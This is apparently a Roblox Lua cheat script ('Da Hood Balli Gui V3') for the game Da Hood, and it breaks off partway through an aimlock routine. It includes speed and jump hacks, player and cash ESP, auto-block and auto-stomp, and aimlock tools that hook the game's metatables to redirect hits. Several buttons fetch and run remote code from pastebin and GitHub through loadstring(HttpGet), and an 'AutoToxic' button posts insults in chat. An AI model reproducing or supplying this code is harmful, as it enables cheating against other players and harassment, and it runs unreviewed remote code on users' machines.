
     
     




local Library = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
local Window = Library.CreateLib("Da Hood Balli Gui V3", "DarkTheme")

local Tab = Window:NewTab("Main")
local Section = Tab:NewSection("Main")
Section:NewTextBox("Speed", "TextboxInfo", function(txt)
game.Players.LocalPlayer.Character.Humanoid.Name = "BuyLinoriaNow"
game.Players.LocalPlayer.Character.BuyLinoriaNow.WalkSpeed = (txt)
end)
Section:NewTextBox("DropCash", "TextboxInfo", function(txt)
game.ReplicatedStorage.MainEvent:FireServer("DropMoney",txt)
end)
Section:NewButton("Hide Stomp", "ButtonInfo", function()
Plr = game.Players.LocalPlayer

game:GetService('RunService'):BindToRenderStep("Hide - Block", 0 , function()

		wait()
		for _,v in pairs(Plr.Character:FindFirstChildWhichIsA('Humanoid'):GetPlayingAnimationTracks()) do
			if v.Name == 'Stomp' then
				v:Stop()
			end
		end
end)
end)
Section:NewButton("Hide Block", "ButtonInfo", function()
Plr = game.Players.LocalPlayer

game:GetService('RunService'):BindToRenderStep("Hide - Block", 0 , function()

		wait()
		for _,v in pairs(Plr.Character:FindFirstChildWhichIsA('Humanoid'):GetPlayingAnimationTracks()) do
			if v.Name == 'Block' then
				v:Stop()
			end
		end
end)
end)
Section:NewButton("Auto Block", "ButtonInfo", function()
MainEvent = game:GetService('ReplicatedStorage').MainEvent
player = game.Players.LocalPlayer;
Distancia = 15; -- Here put the distance to activate

game:GetService('RunService'):BindToRenderStep("Auto-Block", 0 , function()

	local forbidden = {'[Popcorn]','[HotDog]','[GrenadeLauncher]','[RPG]','[SMG]','[TacticalShotgun]','[AK47]','[AUG]','[Glock]', '[Shotgun]','[Flamethrower]','[Silencer]','[AR]','[Revolver]','[SilencerAR]','[LMG]','[P90]','[DrumGun]','[Double-Barrel SG]','[Hamburger]','[Chicken]','[Pizza]','[Cranberry]','[Donut]','[Taco]','[Starblox Latte]','[BrownBag]','[Weights]','[HeavyWeights]'}
local Found = false
for _,v in pairs(game.Workspace.Players:GetChildren()) do
	if (v.UpperTorso.Position - player.Character.HumanoidRootPart.Position).Magnitude <= Distancia then
		if v.BodyEffects.Attacking.Value == true and not table.find(forbidden, v:FindFirstChildWhichIsA('Tool').Name ) and v.Name ~= player.Name then
			Found = true
			MainEvent:FireServer('Block', player.Name)
			
		end
	end
end
if Found == false then
	if player.Character.BodyEffects:FindFirstChild('Block') then player.Character.BodyEffects.Block:Destroy() end
	end
end)
end)
Section:NewToggle("Open/Close Admin Base", "ToggleInfo", function(state)
    if state then
        local part = game:GetService("Workspace").MAP["EVIL_SPECIAL"]

				if part.CFrame == CFrame.new(-428.255005, 17.100769, -886, 1, 0, 0, 0, 1, 0, 0, 0, 1) then

					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,1,0)
					end
    else
      local part = game:GetService("Workspace").MAP["EVIL_SPECIAL"]

				if part.CFrame == CFrame.new(-428.255005, 43.100769, -886, 1, 0, 0, 0, 1, 0, 0, 0, 1) then

					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
					wait(0.1)
					part.CFrame = part.CFrame + Vector3.new(0,-1,0)
				end
    end
end)
Section:NewButton("Pick All Knife/Lockpick", "ButtonInfo", function()
char = game:GetService('Players').LocalPlayer.Character
				-------------------------------------
				function GetKnife()
					wait(.1)
					char.HumanoidRootPart.CFrame = CFrame.new(-680.2, 19.75, -254.97)
					wait()
					char.HumanoidRootPart.CFrame = CFrame.new(-115.495, 19.756, -453.45)
					wait()
					char.HumanoidRootPart.CFrame = CFrame.new(-418.208, 19.25, -748.694)
					wait()
					char.HumanoidRootPart.CFrame = CFrame.new(-418.208, 19.25, -748.694)
					wait()
					char.HumanoidRootPart.CFrame = CFrame.new(-265.9871520996094, 22.0657901763916, -268.7344055175781)
					wait()
					char.HumanoidRootPart.CFrame = CFrame.new(33, 19.75, -184.6)
					wait()
					char.HumanoidRootPart.CFrame = CFrame.new(243.495, 62, -450.5)
					wait()
					char.HumanoidRootPart.CFrame = CFrame.new(-103.53, 19.75, -220.21)
					wait()
					char.HumanoidRootPart.CFrame = CFrame.new(-581.775, 19.7549, -485.23)
					wait()
					char.HumanoidRootPart.CFrame = CFrame.new(-534.9291381835938, 21.74999237060547, 242.1298828125)
					wait()
					char.HumanoidRootPart.CFrame = CFrame.new(-399.655, 19.7552, -461.55)
					wait()
				end

				wait()
				local X = char.HumanoidRootPart.CFrame.X
				local Y = char.HumanoidRootPart.CFrame.Y
				local Z = char.HumanoidRootPart.CFrame.Z
				GetKnife()
				repeat GetKnife() until plr.Backpack:FindFirstChild('[Knife]') and plr.Backpack:FindFirstChild('[LockPicker]')
				char.HumanoidRootPart.CFrame = CFrame.new(X,Y+5,Z)
end)
Section:NewButton("CrispyNuker (CrispyGo)", "ButtonInfo", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/CrispyNuker/main/YesEpic"))()
end)
Section:NewButton("AutoToxic", "ButtonInfo", function()


local function chat(msg)
   game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
end

local Randomize = math.random(1, 4)
local Throwdown = math.random(1, 25)

local Mode = 1 -- 0: Dialogue Start | 1: Dialogue | 2: Always throwdown

local function BenDialogue()
   if Throwdown == 1 then
       ThrowdownDialogue()
   elseif Randomize == 1 then
       chat("ez clown")
   elseif Randomize == 2 then
       chat("dog aim kiddo")
   elseif Randomize == 3 then
       chat("ez bozo")
   elseif Randomize == 4 then
       chat("learn some aiming kid")
   end
end

local function BenDialogueStart()
   chat("*ringring*")
   task.wait(2)
   chat("*picks up the phone*")
   task.wait(0.7)
   chat("ben")
end

if Mode == 0 then
   BenDialogueStart()
elseif Mode == 1 then
   BenDialogue()
elseif Mode == 2 then
   ThrowdownDialogue()
else
   warn("Wrong mode! || Ben Script by BlastingStone#8878")
end
end)
Section:NewButton("Rejoin", "ButtonInfo", function()
game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
end)
Section:NewButton("Esp Player (Not Mine)", "ButtonInfo", function()
local esp_settings = { ---- table for esp settings 
    textsize = 8,
    colour = 255,255,255
}
 
local gui = Instance.new("BillboardGui")
local esp = Instance.new("TextLabel",gui) ---- new instances to make the billboard gui and the textlabel
 
 
 
gui.Name = "Cracked esp"; ---- properties of the esp
gui.ResetOnSpawn = false
gui.AlwaysOnTop = true;
gui.LightInfluence = 0;
gui.Size = UDim2.new(1.75, 0, 1.75, 0);
esp.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
esp.Text = ""
esp.Size = UDim2.new(0.0001, 0.00001, 0.0001, 0.00001);
esp.BorderSizePixel = 4;
esp.BorderColor3 = Color3.new(esp_settings.colour)
esp.BorderSizePixel = 0
esp.Font = "GothamSemibold"
esp.TextSize = esp_settings.textsize
esp.TextColor3 = Color3.fromRGB(esp_settings.colour) -- text colour
 
game:GetService("RunService").RenderStepped:Connect(function() ---- loops faster than a while loop :)
    for i,v in pairs (game:GetService("Players"):GetPlayers()) do
        if v ~= game:GetService("Players").LocalPlayer and v.Character.Head:FindFirstChild("Cracked esp")==nil  then -- craeting checks for team check, local player etc
            esp.Text = "{"..v.Name.."}"
            gui:Clone().Parent = v.Character.Head
    end
end
end)
end)
Section:NewToggle("AutoJump", "ToggleInfo", function(state)
    if state then
        
_G.Toggle = true

while _G.Toggle do
wait()
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end
    else
        
_G.Toggle = false

while _G.Toggle do
wait()
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end
    end
end)
Section:NewToggle("AutoStomp", "ToggleInfo", function(state)
    if state then
        
_G.Toggle = true

while _G.Toggle do
wait()
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
end
    else
        
_G.Toggle = false

while _G.Toggle do
wait()
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
end
    end
end)
Section:NewButton("No Cooldown Jump", "ButtonInfo", function()
--you smell raw beef--
if not game.IsLoaded(game) then
   game.Loaded.Wait(game.Loaded);
end


local IsA = game.IsA;
local newindex = nil


newindex = hookmetamethod(game, "__newindex", function(self, Index, Value)
   if not checkcaller() and IsA(self, "Humanoid") and Index == "JumpPower" then
       return
   end
   
   return newindex(self, Index, Value);
end)
end)
Section:NewButton("Animation Pack V2 (Not Mine)", "ButtonInfo", function()
loadstring(game:HttpGet("https://pastebin.com/raw/Jr4L5pxB"))()
end)
Section:NewButton("Cash Counter", "ButtonInfo", function()
local Holder = Instance.new("ScreenGui", game:GetService("CoreGui"))
local TextLabel = Instance.new("TextLabel", Holder)
TextLabel.Size = UDim2.new(0, 75, 0, 50)

local Drops = Workspace.Ignored.Drop

local TotalAmount = 0

for i,v in next, Drops:GetChildren() do
    if v.Name == "MoneyDrop" then
        local Money = string.gsub(v.BillboardGui.TextLabel.Text, "%D", "")

        TotalAmount = TotalAmount + Money
    end
end

Drops.ChildAdded:Connect(function (Child)
    if Child.Name == "MoneyDrop" then
        local Object = Child:WaitForChild("BillboardGui"):WaitForChild("TextLabel")
        local Money = string.gsub(Object.Text, "%D", "")

        TotalAmount = TotalAmount + Money
    end
end)

Drops.ChildRemoved:Connect(function (Child)
    if Child.Name == "MoneyDrop" then
        local Money = string.gsub(Child.BillboardGui.TextLabel.Text, "%D", "")

        TotalAmount = TotalAmount - Money
    end
end)

game:GetService("RunService").Heartbeat:Connect(function ()
    TextLabel.Text = tostring(TotalAmount)
end)
end)
Section:NewButton("Cash Esp (Not Mine)", "ButtonInfo", function()
while wait(1) do
    for i,v in pairs(workspace.Ignored.Drop:GetChildren()) do
  if v.Transparency == 0 then
      a = Instance.new("BillboardGui", v)
      a.Size = UDim2.new(0,20,0,20)
      a.AlwaysOnTop = true
      b = Instance.new("TextLabel", a)
      b.Size = UDim2.new(0,20,0,20)
      b.Text = "$"
      b.BackgroundTransparency = 1
      b.TextColor3 = Color3.fromRGB(0,255,0)
      b.TextStrokeTransparency = 0
  end
 
  v:GetPropertyChangedSignal("Transparency"):Connect(function()
      v.BillboardGui:Destroy()
  end)
end
    end
end)
Section:NewButton("Chat Spy", "ButtonInfo", function()
loadstring(game:HttpGet("https://pastebin.com/raw/YfcHkZ3f"))()
end)
Section:NewTextBox("Fov", "TextboxInfo", function(txt)
local amount = 150

game:GetService'Workspace'.Camera.FieldOfView = (txt)
end)
Section:NewTextBox("MaxZoom", "TextboxInfo", function(txt)
game.Players.LocalPlayer.CameraMaxZoomDistance = (txt)
end)
Section:NewButton("Force Reset", "ButtonInfo", function()
game.Players.LocalPlayer.Character.Head:Destroy()
end)
Section:NewButton("Anti Knock", "ButtonInfo", function()
game:GetService('Players').LocalPlayer.Character.Humanoid:GetPropertyChangedSignal('Health'):Connect(function()
   if game:GetService('Players').LocalPlayer.Character.Humanoid.Health < 20 then
       plr = game:GetService('Players').LocalPlayer

        local char = plr.Character

        char.HumanoidRootPart.Velocity = char.HumanoidRootPart.CFrame.lookVector * 500
        wait()
      end
end)
end)
Section:NewButton("Anti Stomp", "ButtonInfo", function()
game:GetService('Players').LocalPlayer.Character.Humanoid:GetPropertyChangedSignal('Health'):Connect(function()
   if game:GetService('Players').LocalPlayer.Character.Humanoid.Health < 10 then
game.Players.LocalPlayer.Character.Humanoid:Destroy()
game.Players.LocalPlayer.Character.Humanoid.Health = 0
   end
end)
end)
Section:NewButton("Fps/Ping Counter", "ButtonInfo", function()
loadstring(game:HttpGet("https://pastebin.com/raw/K4Jjj6z8"))()
end)
Section:NewButton("Rightclick", "ButtonInfo", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BalligusapoTT/BalligusapoTT/main/Leftclickballi"))()
end)
Section:NewButton("Show Masked Player", "ButtonInfo", function()
for i,v in pairs(game.Workspace.Players:GetChildren()) do
        v:FindFirstChildWhichIsA('Humanoid').DisplayDistanceType = 'Subject'
    end
end)
local Tab = Window:NewTab("Aimlock")
local Section = Tab:NewSection("Best Aimlock Tools")
Section:NewButton("Balli Aimlock Tool 1", "ButtonInfo", function()
mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Balli Aimlock Tool 1"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
local vim = game:service("VirtualInputManager")
vim:SendKeyEvent(true, "Q", false, game)
loadstring(game:HttpGet("https://pastebin.com/raw/thi3P3WQ"))()
end)
tool.Parent = game.Players.LocalPlayer.Backpack
end)
Section:NewButton("Balli Aimlock Tool 2", "ButtonInfo", function()
mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Balli Aimlock Tool 2"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
local vim = game:service("VirtualInputManager")
vim:SendKeyEvent(true, "Q", false, game)
end)
tool.Parent = game.Players.LocalPlayer.Backpack

-- Toggle
getgenv().Target = true

-- Configuration
getgenv().Key = Enum.KeyCode.Q
getgenv().Prediction = 0.1393
getgenv().ChatMode = false
getgenv().NotifMode = true
    getgenv().PartMode = true
    getgenv().AirshotFunccc = false
    getgenv().Partz = "HumanoidRootPart"
getgenv().AutoPrediction = false
getgenv().Fov = 70
getgenv().Circle = true
--
    _G.Types = {
        Ball = Enum.PartType.Ball,
        Block = Enum.PartType.Block, 
        Cylinder = Enum.PartType.Cylinder
    }
    
    --variables                 
    	local Tracer = Instance.new("Part", game.Workspace)
    Tracer.Name = "Ballitool"	
    Tracer.Anchored = true		
    Tracer.CanCollide = false
    Tracer.Transparency = 0.7
    Tracer.Parent = game.Workspace	
    Tracer.Shape = _G.Types.Block
    Tracer.Size = Vector3.new(7,7,7)
    Tracer.Color = Color3.fromRGB(0,0,0)
    
    --
    local plr = game.Players.LocalPlayer
local mouse = plr:GetMouse()
local Runserv = game:GetService("RunService")

circle = Drawing.new("Circle")
circle.Color = Color3.fromRGB(0,0,0)
circle.Thickness = 0
circle.NumSides = 732
circle.Radius = getgenv().Fov
circle.Thickness = 0
circle.Transparency = 0
circle.Visible = getgenv().Circle
circle.Filled = false

Runserv.RenderStepped:Connect(function()
    circle.Position = Vector2.new(mouse.X,mouse.Y+35)
    if getgenv().AirshotFunccc == true then
            if Plr ~= nil then else return; end
            if Plr.Character.Humanoid.Jump == true and Plr.Character.Humanoid.FloorMaterial == Enum.Material.Air then
                getgenv().Partz = "RightFoot"
            else
                Plr.Character:WaitForChild("Humanoid").StateChanged:Connect(function(old,new)
                    if new == Enum.HumanoidStateType.Freefall then
                    getgenv().Partz = "RightFoot"
                    else
                        getgenv().Partz = "HumanoidRootPart"
                    end
                end)
            end
end
end)
    
    	local guimain = Instance.new("Folder", game.CoreGui)
    	local CC = game:GetService"Workspace".CurrentCamera
    local LocalMouse = game.Players.LocalPlayer:GetMouse()
    	local Locking = false
    
    	
    --
    if getgenv().valiansh == true then
                        game.StarterGui:SetCore("SendNotification", {
                   Title = "DH Balli Gui",
                   Text = "Aimlock Tool Loaded!.",
                   Duration = 5
        
                   })
        return
    end
    
    getgenv().valiansh = true
    
        local UserInputService = game:GetService("UserInputService")

    UserInputService.InputBegan:Connect(function(keygo,ok)
           if (not ok) then
           if (keygo.KeyCode == getgenv().Key) then
               if getgenv().Target == true then
               Locking = not Locking
               
               if Locking then
               Plr =  getClosestPlayerToCursor()
                if getgenv().ChatMode then
        local A_1 = ""..tostring(Plr.Character.Humanoid.DisplayName) local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
        	end	
               if getgenv().NotifMode then
    			game.StarterGui:SetCore("SendNotification", {
        Title = "Player Locked!";
        Text = ""..tostring(Plr.Character.Humanoid.DisplayName);
    
    })
    end
    elseif not Locking then
         if getgenv().ChatMode then
        local A_1 = "" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
        	end	
        if getgenv().NotifMode then
                        game.StarterGui:SetCore("SendNotification", {
                   Title = "DH Balli Gui",
                   Text = "Player Unlocked!",
                   Duration = 5
               })
           elseif getgenv().Target == false then
                        game.StarterGui:SetCore("SendNotification", {
                   Title = "",
                   Text = "Target Left Or Died ",
                   Duration = 5
     
                   })
               
               end
                  
 
 end     end   
end
end
end)
	
	function getClosestPlayerToCursor()
		local closestPlayer
		local shortestDistance = circle.Radius

		for i, v in pairs(game.Players:GetPlayers()) do
			if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("LowerTorso") then
				local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
				local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(LocalMouse.X, LocalMouse.Y)).magnitude
				if magnitude < shortestDistance then
					closestPlayer = v
					shortestDistance = magnitude
				end
			end
		end
		return closestPlayer
	end
--
if getgenv().PartMode then
	game:GetService"RunService".Stepped:connect(function()
		if Locking and Plr.Character and Plr.Character:FindFirstChild("LowerTorso") then
			Tracer.CFrame = CFrame.new(Plr.Character.LowerTorso.Position+(Plr.Character.LowerTorso.Velocity*Prediction))
		else
			Tracer.CFrame = CFrame.new(0, 9999, 0)
		end
	end)
end

    
    
    --
	local rawmetatable = getrawmetatable(game)
	local old = rawmetatable.__namecall
	setreadonly(rawmetatable, false)
	rawmetatable.__namecall = newcclosure(function(...)
		local args = {...}
		if Locking and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then
			args[3] = Plr.Character[getgenv().Partz].Position+(Plr.Character[getgenv().Partz].Velocity*Prediction)
			return old(unpack(args))
		end
		return old(...)
	end)
---
	while wait() do
	if getgenv().AutoPrediction == true then
        local pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
        local split = string.split(pingvalue,'(')
        local ping = tonumber(split[1])
        if ping < 130 then
            getgenv().Prediction = 0.151
        elseif ping < 125 then
            getgenv().Prediction = 0.149
        elseif ping < 110 then
            getgenv().Prediction = 0.140
        elseif ping < 105 then
            getgenv().Prediction = 0.133
        elseif ping < 90 then
            getgenv().Prediction = 0.130
        elseif ping < 80 then
            getgenv().Prediction = 0.128
        elseif ping < 70 then
            getgenv().Prediction = 0.1230
        elseif ping < 60 then
            getgenv().Prediction = 0.1229
        elseif ping < 50 then
            getgenv().Prediction = 0.1225
        elseif ping < 40 then
            getgenv().Prediction = 0.1256
        end
	end
    end
end)
Section:NewButton("Balli Aimlock Tool 3", "ButtonInfo", function()
loadstring(game:HttpGet("https://pastebin.com/raw/3KcR3TzN"))()
end)
Section:NewButton("Ryzzchips Aimlock Tool", "ButtonInfo", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Ryzzchips/MOON-GOD-SCRIPTS/main/Ryzzchips%20tool"))();
end)
Section:NewButton("Random Aimlock Tool", "ButtonInfo", function()
mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Random Aimlock Tool"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
local vim = game:service("VirtualInputManager")
vim:SendKeyEvent(true, "Q", false, game)
-- https://discord.gg/rTgRJrqFdT
-- https://discord.gg/rTgRJrqFdT
-- https://discord.gg/rTgRJrqFdT
-- https://discord.gg/rTgRJrqFdT
-- https://discord.gg/rTgRJrqFdT
-- https://discord.gg/rTgRJrqFdT
-- https://discord.gg/rTgRJrqFdT
-- https://discord.gg/rTgRJrqFdT


--// KAL SKIDDED THIS SHIT! HE DIDNT MADE THIS BTW
    Settings = {
        Kalslock = {
        Enabled = true,
        Key = "q",
        showdot = true,
        airshots = true,
        notifaction = true,
        pingprediction = true,
        FOV = math.huge,
        RESOVLER = true,
        Tracer = true,
        TracerColor = Color3.new(0, 255, 238),
        TracerTransparency = 0.75,
        TracerThickness = 5,
        Circles = false,
        CircleFOV = 500,
        CircleColor = Color3.new(255, 255, 255),
        CircleThickness = 2,
        CircleFilled = true,
        CircleTransparency = 0.10,
        CircleTransparencyOutline = 0,
        OutlineColor = Color3.new(255, 255, 255),
        Texts = false, 
        TextColor = Color3.new(255, 255, 255),
        TextSize = 35,
        TextInput = "skidded",
        Hitbox = true,
        NoBulletDelay = false,
        Autoclicker = false,
        AutoclickerTime = 0.01,
        AutoclickerKey = "v",
        AnimationPack = false
    
}
}

--[[
    Parts - / HumanoidRootPart / LowerTorso / UpperTorso / Head 
]]

        local SelectedPart = "HumanoidRootPart"
        local Prediction = true
        local PredictionValue = 0.132
        


 local AnchorCount = 0
            local MaxAnchor = 50

                local CC = game:GetService"Workspace".CurrentCamera
                    local Plr;
                        local enabled = false
                            local accomidationfactor = 0.132
                local mouse = game.Players.LocalPlayer:GetMouse()
                    
                            local Inset = game:GetService("GuiService"):GetGuiInset().Y
                local Line = Drawing.new("Line")
                    local Text = Drawing.new("Text")
                          local Circle = Drawing.new("Circle")
                          local Circle1 = Drawing.new("Circle")
                          
                          
                           _G.Types = {
            Ball = Enum.PartType.Ball,
            Block = Enum.PartType.Block, 
            Cylinder = Enum.PartType.Cylinder
        }
                          
                          local placemarker = Instance.new("Part", game.Workspace)
                          placemarker.Shape = _G.Types.Ball
                          placemarker.Material = "ForceField"
                          placemarker.Color = Color3.new(0, 1, 1)

    function makemarker(Parent, Adornee, Color, Size, Size2)
        local e = Instance.new("BillboardGui", Parent)
        e.Name = "PP"
        e.Adornee = Adornee
        e.Size = UDim2.new(Size, Size2, Size, Size2)
        e.AlwaysOnTop = Settings.Kalslock.showdot
        local a = Instance.new("Frame", e)
        if Settings.Kalslock.showdot == true then
        a.Size = UDim2.new(1, 0, 1, 0)
        else
        a.Size = UDim2.new(0, 0, 0, 0)
        end
        if Settings.Kalslock.showdot == true then
        a.Transparency = 0
        a.BackgroundTransparency = 0
        else
        a.Transparency = 1
        a.BackgroundTransparency = 1
        end
        a.BackgroundColor3 = Color
        local g = Instance.new("UICorner", a)
        if Settings.Kalslock.showdot == false then
        g.CornerRadius = UDim.new(0, 0)
        else
        g.CornerRadius = UDim.new(1, 1) 
        end
        return(e)
    end

    
    local data = game.Players:GetPlayers()
    function noob(player)
        local character
        repeat wait() until player.Character
        local handler = makemarker(guimain, player.Character:WaitForChild(SelectedPart), Color3.fromRGB(0, 255, 229), 0.3, 3)
        handler.Name = player.Name
        player.CharacterAdded:connect(function(Char) handler.Adornee = Char:WaitForChild(SelectedPart) end)


        spawn(function()
            while wait() do
                if player.Character then
                end
            end
        end)
    end

    for i = 1, #data do
        if data[i] ~= game.Players.LocalPlayer then
            noob(data[i])
        end
    end

    game.Players.PlayerAdded:connect(function(Player)
        noob(Player)
    end)

    spawn(function()
        placemarker.Anchored = true
        placemarker.CanCollide = false
        if Settings.Kalslock.showdot == true then
        placemarker.Size = Vector3.new(11, 11, 11)
        else
        placemarker.Size = Vector3.new(0, 0, 0)
        end
        if Settings.Kalslock.Hitbox == true then
        placemarker.Transparency = 0.30
        else
        placemarker.Transparency = 1
        end
        if Settings.Kalslock.showdot then
        makemarker(placemarker, placemarker, Color3.fromRGB(0, 255, 238), 0.80, 0)
        end
    end)

    game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(k)
        if k == Settings.Kalslock.Key and Settings.Kalslock.Enabled then
            if enabled == true then
                enabled = false
                if Settings.Kalslock.notifaction == true then
                    Plr = getClosestPlayerToCursor()
                game.StarterGui:SetCore("SendNotification", {
                    Title = "Kal Skidded This";
                    Text = "  Unlocked",
                    Icon = "http://www.roblox.com/asset/?id=5314810647",
                    Duration = 3
                })
            end
            else
                Plr = getClosestPlayerToCursor()
                enabled = true
                if Settings.Kalslock.notifaction == true then

                    game.StarterGui:SetCore("SendNotification", {
                        Title = "Kal Skidded This";
                        Text = "  Target: "..tostring(Plr.Character.Humanoid.DisplayName),
                        Icon = "http://www.roblox.com/asset/?id=8709610734",
                        Duration = 3
                    })

                end
            end
        end
    end)



    function getClosestPlayerToCursor()
        local closestPlayer
        local shortestDistance = Settings.Kalslock.FOV

        for i, v in pairs(game.Players:GetPlayers()) do
            if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("HumanoidRootPart") then
                local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
                local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(mouse.X, mouse.Y)).magnitude
                if magnitude < shortestDistance then
                    closestPlayer = v
                    shortestDistance = magnitude
                end
            end
        end
        return closestPlayer
    end

    local pingvalue = nil;
    local split = nil;
    local ping = nil;

    game:GetService"RunService".Stepped:connect(function()
        if enabled and Plr.Character ~= nil and Plr.Character:FindFirstChild("HumanoidRootPart") then
            placemarker.CFrame = CFrame.new(Plr.Character.HumanoidRootPart.Position)
                            local Vector1 = CC:WorldToViewportPoint(Plr.Character.HumanoidRootPart.Position)
            Line.Color = Settings.Kalslock.TracerColor
                Line.Transparency = Settings.Kalslock.TracerTransparency
                Line.Thickness = Settings.Kalslock.TracerThickness
                Line.From = Vector2.new(mouse.X, mouse.Y + Inset)
                Line.To = Vector2.new(Vector1.X, Vector1.Y)
                Line.Visible = Settings.Kalslock.Tracer
                Text.Position = Vector2.new(mouse.X, mouse.Y + Inset)
                Text.Visible = Settings.Kalslock.Texts
                Text.Center = true
                Text.Outline = true
                Text.Font = 1
                Text.Size = Settings.Kalslock.TextSize
                Text.Color = Settings.Kalslock.TextColor
                Text.Text = Settings.Kalslock.TextInput
                Circle.Position = Vector2.new(mouse.X, mouse.Y + Inset)
                Circle.Visible = Settings.Kalslock.Circles
                Circle.Thickness = 1.5
                Circle.Thickness = Settings.Kalslock.CircleThickness
                Circle.Radius = Settings.Kalslock.CircleFOV
                Circle.Color = Settings.Kalslock.CircleColor
